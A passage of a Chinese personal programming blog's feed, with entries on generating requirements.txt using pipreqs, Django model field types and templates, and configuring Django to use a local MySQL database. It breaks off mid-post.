&#123;</span><br><span class="line"><span class="string">&quot;page&quot;</span>: <span class="number">4</span>,</span><br><span class="line"><span class="string">&quot;key&quot;</span>: <span class="number">12</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   最后，我们拼接 url。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;https://127.0.0.1:8000/index/?&#123;&#125;&quot;</span>.<span class="built_in">format</span>(query_dict.urlencode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;https://127.0.0.1:8000/index/?page=4&amp;key=12&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;为 django 中的 modelform 添加样式。&lt;/p&gt;</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="框架" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="django" scheme="https://blog.snowflake.zone/tags/django/"/>
    
    <category term="python" scheme="https://blog.snowflake.zone/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>快速生成requirements.txt</title>
    <link href="https://blog.snowflake.zone/posts/11/"/>
    <id>https://blog.snowflake.zone/posts/11/</id>
    <published>2022-07-28T16:00:00.000Z</published>
    <updated>2022-07-28T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>  众所周知，Python的运行效率是不高的。但为什么Python还是很广泛地被使用呢？那当然是成熟的第三方库的加持！可以说Python的第三方库只有你想不到，没有他做不到的。因此，对于一个自己的或者是clone来的项目，下载依赖包就显得非常之重要。</p><h1 id="快速生成requirementtxt"><a class="markdownIt-Anchor" href="#快速生成requirementtxt"></a> 快速生成requirement.txt</h1><p>  首先我们用包管理工具pip安装生成requirements.txt的插件。</p><div class="tag-plugin copy"><input class="copy-area" id="copy_9" value="pip install pipreqs"><button class="copy-btn" onclick="util.copy(&quot;copy_9&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>  然后一行简单的命令就可以快速生成requirements.txt啦！</p><div class="tag-plugin copy"><input class="copy-area" id="copy_10" value="pipreqs . --encoding=utf-8 --force"><button class="copy-btn" onclick="util.copy(&quot;copy_10&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>  比起传统的<code>pip freeze &gt; requirement.txt</code>这句命令，上面可以做到虚拟环境之间相互隔离！也就是说，生成的requirements.txt只会包含当前项目用到的包，也很合常理对吧？</p><h1 id="偶尔水一水也不会有事的吧"><a class="markdownIt-Anchor" href="#偶尔水一水也不会有事的吧"></a> 偶尔水一水也不会有事的吧？</h1>]]></content>
    
    
    <summary type="html">两行命令快速生成项目的requirements.txt！</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="语言" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Python" scheme="https://blog.snowflake.zone/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>django学习笔记(3)：models数据类型处理</title>
    <link href="https://blog.snowflake.zone/posts/10/"/>
    <id>https://blog.snowflake.zone/posts/10/</id>
    <published>2022-07-21T16:00:00.000Z</published>
    <updated>2022-07-21T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>如何在 django 中处理不同的数据类型？</p><span id="more"></span><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>  django 通过继承<code>models</code>类来完成数据库表的创建，其中牵涉了很多数据类型和相关的知识点，这里把最近碰到的记录一下。</p><h1 id="django-中数据类型的处理"><a class="markdownIt-Anchor" href="#django-中数据类型的处理"></a> Django 中数据类型的处理</h1><p>  首先来看一下最近一个练手项目(用户管理系统)中基础的<strong>部门表</strong>和<strong>用户表</strong>的定义。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 员工管理系统</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Department</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;这是部门的表：id, title&quot;&quot;&quot;</span></span><br><span class="line">    title = models.CharField(verbose_name=<span class="string">&#x27;标题&#x27;</span>, max_length=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;员工表&quot;&quot;&quot;</span></span><br><span class="line">    name = models.CharField(verbose_name=<span class="string">&#x27;姓名&#x27;</span>, max_length=<span class="number">16</span>)</span><br><span class="line">    password = models.CharField(verbose_name=<span class="string">&#x27;密码&#x27;</span>, max_length=<span class="number">64</span>)</span><br><span class="line">    age = models.IntegerField(verbose_name=<span class="string">&#x27;年龄&#x27;</span>)</span><br><span class="line">    account = models.DecimalField(verbose_name=<span class="string">&#x27;账户余额&#x27;</span>, max_digits=<span class="number">10</span>,</span><br><span class="line">                                  decimal_places=<span class="number">2</span>, default=<span class="number">0</span>)</span><br><span class="line">    create_time = models.DateTimeField(verbose_name=<span class="string">&#x27;入职时间&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    depart = models.ForeignKey(to=<span class="string">&quot;Department&quot;</span>, to_field=<span class="string">&quot;id&quot;</span>, on_delete=models.CASCADE)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 性别选项</span></span><br><span class="line">    gender_choices = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">&quot;男&quot;</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">&quot;女&quot;</span>),</span><br><span class="line">    )</span><br><span class="line">    gender = models.SmallIntegerField(verbose_name=<span class="string">&quot;性别&quot;</span>, choices=gender_choices)</span><br></pre></td></tr></table></figure><p>  针对上面出现的类型，这里做一些相应地解释。</p><h2 id="charfield"><a class="markdownIt-Anchor" href="#charfield"></a> CharField</h2><p>  <code>CharField</code>是基础的字符串类型，上述案例中，<code>verbose_name=</code>参数在许多函数中都出现了，实际上，这个参数主要是便于开发者自己了解每一个字段代表什么含义，由于我们是 Django 开发，因此我们使用注释的方案也可以，具体看个人喜好。对于 CharField 来说，<code>max_length=</code>是必要的，因为在创建 MySQL 表时，我们需要指定每一个<code>varchar</code>的字节数。</p><h2 id="decimalfield"><a class="markdownIt-Anchor" href="#decimalfield"></a> DecimalField</h2><p>  是 Python 中十进制浮点数的实例。上述例子中含有两个参数，<code>max_digits=</code>表示数字位数，这是<strong>同时包含整数部分和小数部分的位数</strong>。<code>decimal_places=</code>表示小数位数。<code>default=</code>用于在使用<code>UserInfo.objects.create()</code>时没有指定<code>account</code>参数值的时候的默认值。</p><h2 id="datetimefield"><a class="markdownIt-Anchor" href="#datetimefield"></a> DateTimeField</h2><p>  <code>DateTimeField</code>是专门存储时间的字段类型，格式为<code>Y-m-d H:m:s</code>。当我们要输出这个值时，我们通常要先对其进行格式化。我们使用<code>strftime(&#123;format&#125;)</code>来达到这个目的。format 的格式包含以下多种选择。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%y 两位数的年份表示（00-99）</span><br><span class="line">%Y 四位数的年份表示（000-9999）</span><br><span class="line">%m 月份（01-12）</span><br><span class="line">%d 月内中的一天（0-31）</span><br><span class="line">%H 24小时制小时数（0-23）</span><br><span class="line">%I 12小时制小时数（01-12）</span><br><span class="line">%M 分钟数（00=59）</span><br><span class="line">%S 秒（00-59）</span><br><span class="line">%a 本地简化星期名称</span><br><span class="line">%A 本地完整星期名称</span><br><span class="line">%b 本地简化的月份名称</span><br><span class="line">%B 本地完整的月份名称</span><br><span class="line">%c 本地相应的日期表示和时间表示</span><br><span class="line">%j 年内的一天（001-366）</span><br><span class="line">%p 本地A.M.或P.M.的等价符</span><br><span class="line">%U 一年中的星期数（00-53）星期天为星期的开始</span><br><span class="line">%w 星期（0-6），星期天为星期的开始</span><br><span class="line">%W 一年中的星期数（00-53）星期一为星期的开始</span><br><span class="line">%x 本地相应的日期表示</span><br><span class="line">%X 本地相应的时间表示</span><br><span class="line">%Z 当前时区的名称</span><br><span class="line">%% %号本身</span><br></pre></td></tr></table></figure><p>当然，我们最常用的还是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">time.strftime(<span class="string">&quot;%Y-%m-%d %H:%m:%s&quot;</span>)  <span class="comment"># 精确到秒的时间记录</span></span><br><span class="line">time.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)  <span class="comment"># 精确到日期的时间记录</span></span><br></pre></td></tr></table></figure><p>  在 Django 模板语法中，一般是不允许出现括号的。在前端页面，我们需要改写成</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; time|date:&quot;Y-m-d&quot; &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 Pycharm 中按住<kbd>Ctrl</kbd>查看上述案例中<code>date</code>的源码，可以发现其也是一个函数，只不过使用了特殊的<code>|</code>符号表示而已。</p><h2 id="foreignkey"><a class="markdownIt-Anchor" href="#foreignkey"></a> ForeignKey</h2><p>  <code>ForeignKey</code>表示的是外键，也就是将表与表之间建立联系的一种方式。在上述案例中，由于我们需要知晓员工的所属部门，因此我们使用外键将<code>depart</code>字段与<code>Department</code>中的<code>id</code>字段相关联。在 Django 自动生成表的时候，<code>depart</code>字段会被命名成<code>depart_id</code>。使用<code>ForeignKey</code>的时候，我们需要指定参数<code>to=</code>和<code>to_field=</code>，前者指定与哪张表关联，后者指定关联的字段名。当然了，由于关联的原因，我们还需要指定<code>on_delete=</code>，这个参数指定当<code>Department</code>表中的数据删除时，<code>UserInfo</code>中对应这些数据的记录将要如何操作。<code>models.CASCADE</code>表示<strong>级联删除</strong>，即<strong>删除所有与被删除数据相关联的记录</strong>；还可以选择<code>models.SET_NULL</code>，这样所有关联数据的该字段将会被<strong>置空</strong>。但这有一个前提，你需要在参数列表指定该字段可以为空，即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">department = models.ForeignKey(to=<span class="string">&quot;Department&quot;</span>, to_field=<span class="string">&quot;id&quot;</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>, on_delete=models.SET_NULL)</span><br></pre></td></tr></table></figure><p>  在读取数据中，我们需要先获取<code>UserInfo</code>的记录，再通过外链访问<code>Department</code>，即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj = models.UserInfo.objects.fileter(&#123;筛选条件&#125;).first()  <span class="comment"># 获取满足筛选条件的第一个对象</span></span><br><span class="line"><span class="built_in">print</span>(obj.depart_id)  <span class="comment"># 访问obj.depart_id，我们得到的是部门id</span></span><br><span class="line">title = models.Department.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=obj.depart_id).first().title  <span class="comment"># 再次筛选，取出title字段才是我们要的部门名称</span></span><br><span class="line"></span><br><span class="line">title = models.Department.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=models.UserInfo.objects.<span class="built_in">filter</span>(&#123;筛选条件&#125;).first().depart_id).first().title</span><br><span class="line"><span class="comment"># 合并上述语句我们得到非常之长的一句数据库查询语句</span></span><br></pre></td></tr></table></figure><p>显然，这句语句太长了，Django 提供了另一种通过外键查询另一张表的方式，在上述例子中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = models.UserInfo.objects.fileter(&#123;筛选条件&#125;).first()  <span class="comment"># 获取满足筛选条件的第一个对象</span></span><br><span class="line"><span class="built_in">print</span>(obj.depart.title)  <span class="comment"># 这时直接输出了部门名字</span></span><br></pre></td></tr></table></figure><p>在这种书写方式下，<code>obj.depart</code>直接返回根据<code>depart_id</code>查询到的第一个<code>object</code>。由于我们这个案例中 ID 值唯一，于是直接访问其<code>.title</code>即可。</p><p>  于是在前端页面，我们可以通过如下的模板语法访问每一个人对应的部门的名称：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">  &#123;% for obj in userinfo_list %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; obj.depart.title &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="smallintegerfield"><a class="markdownIt-Anchor" href="#smallintegerfield"></a> SmallIntegerField</h2><p>  该数据类型常应用于固定的枚举型，例如上例中的性别。在绝大多数情况下，性别是不会继续添加的，因此我们可以用元组的嵌套来指定这种对应关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gender_choices=(</span><br><span class="line">    (<span class="number">1</span>, <span class="string">&quot;男&quot;</span>),</span><br><span class="line">    (<span class="number">2</span>, <span class="string">&quot;女&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>相比于存储汉字，在数据库中存储短整型占用更少的存储空间。这种情况下，你需要为<code>SmallIntegerField</code>指定参数<code>choices=</code>。这个参数接受一个嵌套元组用来指定对应关系。</p><p>  当然，这会带来一个问题，我们访问<code>obj.gender</code>时，会输出整型而非我们想要的汉字“男”或“女”，同样的，Django 提供了一个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj.get_gender_display()  <span class="comment"># 这个函数名称会随着你对字段名命名的不同而变化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命名规则</span></span><br><span class="line">obj.get_&#123;字段名称&#125;_display()</span><br></pre></td></tr></table></figure><p>  在前端页面，你可以使用模板语法来完成这个功能：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; obj.get_gender_display &#125;&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是：<strong>你依然不需要在函数末尾添加括号。</strong></p><h1 id="django-的-html-模板"><a class="markdownIt-Anchor" href="#django-的-html-模板"></a> Django 的 html 模板</h1><div class="tag-plugin colorful note" color="blue"><div class="body"><p>这部分不是本文的重点，但也是Django开发中十分重要的一部分，其可以大大增加代码复用率。因此也一并写在这里。</p></div></div><p>  很多时候，许多 HTML 文件都具备一部分的相同结构，例如，所有页面都有页面顶部的导航栏(navigation bar)，都需要引入相同的 css 和 js 等文件。Django 提供模板页面来解决这个问题。我们只需要在模板文件中需要被插入的结构加入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--省略以上html内容--&gt;</span></span><br><span class="line"></span><br><span class="line">  &#123;% block &#123;板块名称&#125; %&#125; &#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--省略以下html内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后再需要使用的页面引入该模板即可，如果模板名称为<code>layout.html</code>，那么就可以写成这样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#x27;layout.html&#x27; %&#125; &#123;% block &#123;模块名称&#125; %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--这里是你的html--&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>渲染该页面时，Django 会自动将其与模板<code>layout.html</code>拼接。一个模板中可以有多个这样的结构，一个 HTML 文件中也可以由多个这样的结构组成。</p><h1 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h1><p>  这篇文章字不多，但干货占比也挺高的。赶紧写出来也是方便我后续复习和查询使用。~~所以就浅浅地日更了一下。~~那这篇文章就到此结束吧！该休息咯。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;如何在 django 中处理不同的数据类型？&lt;/p&gt;</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="框架" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="django" scheme="https://blog.snowflake.zone/tags/django/"/>
    
    <category term="python" scheme="https://blog.snowflake.zone/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>django学习笔记(2)：操作MySQL数据库</title>
    <link href="https://blog.snowflake.zone/posts/9/"/>
    <id>https://blog.snowflake.zone/posts/9/</id>
    <published>2022-07-20T16:00:00.000Z</published>
    <updated>2022-07-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用 django 操作 mysql 数据库。</p><span id="more"></span><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>  数据库是 web 应用中很重要的组成部分之一。Django 框架自带了 sqlite3 数据库，然而在使用的广泛程度上，MySQL 的应用场景更加多。本篇主要解释如何将数据库换成 MySQL，以及一些基本用法。</p><h1 id="更换默认数据库为-mysql"><a class="markdownIt-Anchor" href="#更换默认数据库为-mysql"></a> 更换默认数据库为 MySQL</h1><h2 id="创建数据库"><a class="markdownIt-Anchor" href="#创建数据库"></a> 创建数据库</h2><p>  由于 django 的 orm 只能完成对于表的操作，因此数据库的创建需要我们自行完成，这里以本地 MySQL 数据库为例。在 MySQL 终端输入</p><div class="tag-plugin copy"><input class="copy-area" id="copy_4" value="create database {数据库名} DEFAULT CHARSET utf8 COLLATE utf8_general_ci;"><button class="copy-btn" onclick="util.copy(&quot;copy_4&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>完成数据库的创建。然后运行 <code>use &#123;db_name&#125;</code> ，若提示为 empty set（空的数据库），则创建成功。</p><h2 id="安装第三方依赖"><a class="markdownIt-Anchor" href="#安装第三方依赖"></a> 安装第三方依赖</h2><p>  首先我们需要安装第三方包 <code>pymysql</code> （你也可以使用<code>mysqlclient</code>），这个第三方包能够帮助 Django 完成对 MySQL 数据库的增删改查操作，</p><div class="tag-plugin copy"><input class="copy-area" id="copy_5" value="pip install pymysql"><button class="copy-btn" onclick="util.copy(&quot;copy_5&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><div class="tag-plugin colorful note" color="blue"><div class="body"><p>如果安装缓慢，可以参考本系列的第一篇文章，将安装源换成国内镜像站。</p></div></div><h2 id="更改项目配置文件"><a class="markdownIt-Anchor" href="#更改项目配置文件"></a> 更改项目配置文件</h2><p>  在项目目录下找到<code>setting.py</code>，找到<code>DATABASES</code>，这里默认是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line"><span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line"><span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.sqlite3&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;NAME&#x27;</span>: BASE_DIR / <span class="string">&#x27;db.sqlite3&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>ENGINE</code> 指明了数据库类型， <code>NAME</code> 指明了数据库名称。默认情况下，Django 使用内部集成的 sqlite3.我们修改之，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line"><span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line"><span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;webapp&#x27;</span>, <span class="comment"># 数据库名字</span></span><br><span class="line"><span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;&#123;你的密码&#125;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment"># MySQL 在哪个 ip</span></span><br><span class="line"><span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span>, <span class="comment"># 端口号</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>HOST</code>是主机 ip，这里使用的是本地，因此是<code>127.0.0.1</code>，<code>PORT</code>是端口号，本地 MySQL 的端口号是<code>3306</code>。然后，你需要在项目的<code>_init_.py</code>中添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure><h1 id="使用-django-操作-mysql-的表"><a class="markdownIt-Anchor" href="#使用-django-操作-mysql-的表"></a> 使用 Django 操作 MySQL 的表</h1><h2 id="创建表"><a class="markdownIt-Anchor" href="#创建表"></a> 创建表</h2><p>  表的操作都可以用 python 语法完成，其中 orm 会将其翻译成 SQL 语句，对于我们来说，无需自己再写 SQL 语句了。</p><p>  在<strong>已注册的应用</strong>下的<code>models.py</code>中新建类，例如我们要创建一个用户信息的表，那么我们可以写成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">name = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">password = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">age = models.IntegerField(default=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然后，我们在终端运行</p><div class="tag-plugin copy"><input class="copy-area" id="copy_6" value="python manage.py makemigrations && python manage.py migrate"><button class="copy-btn" onclick="util.copy(&quot;copy_6&quot;,&quot;复制成功&quot;)"><svg class="icon copy-btn" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></button></div><p>这时，Django 自动为我们创建了表，其相当于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span 